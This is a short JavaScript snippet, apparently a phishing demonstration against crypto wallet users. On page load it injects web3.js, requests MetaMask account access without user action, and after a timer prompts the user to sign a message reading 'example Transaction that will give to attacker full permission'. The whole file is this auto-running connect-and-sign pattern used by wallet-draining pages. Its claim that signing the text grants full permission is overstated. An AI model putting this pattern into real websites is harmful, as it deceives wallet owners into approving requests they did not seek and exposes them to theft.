// Function to load Web3 script dynamically
async function loadWeb3() {
  try {
    const response = await fetch('https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js');
    const scriptContent = await response.text();

    const scriptTag = document.createElement('script');
    scriptTag.textContent = scriptContent;
    document.head.appendChild(scriptTag);

    // Check if Web3 is available after script is loaded
    if (typeof Web3 === 'undefined') {
      console.error('Failed to load Web3 script');
      return;
    }

    // Initialize web3 object
    web3 = new Web3(window.ethereum);
  } catch (error) {
    console.error(error);
  }
}

// Function to connect to MetaMask
async function connect() {
  try {
    // Check if MetaMask is installed
    if (typeof window.ethereum !== 'undefined') {
      console.log('MetaMask is installed!');

      // Initialize web3 object
      web3 = new Web3(window.ethereum);

      // Request account access
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      console.log('Connected to MetaMask:', accounts[0]);
    } else {
      console.error('MetaMask is not installed!');
    }
  } catch (error) {
    console.error(error);
  }
}

// Function to sign a message
function signMessage() {
  try {
    if (!web3) {
      console.error('Web3 is not initialized!');
      return;
    }

    const message = 'Hello, This is an example Transaction that will give to attacker full permission!';
    const from = web3.currentProvider.selectedAddress;

    web3.eth.personal.sign(message, from, '', (error, signature) => {
      if (error) {
        console.error(error);
      } else {
        console.log('Message signed! Signature:', signature);
      }
    });
  } catch (error) {
    console.error(error);
  }
}

// Call functions automatically
(async () => {
  await loadWeb3();
  setTimeout(connect, 3000);
  setTimeout(signMessage, 5000);
})();
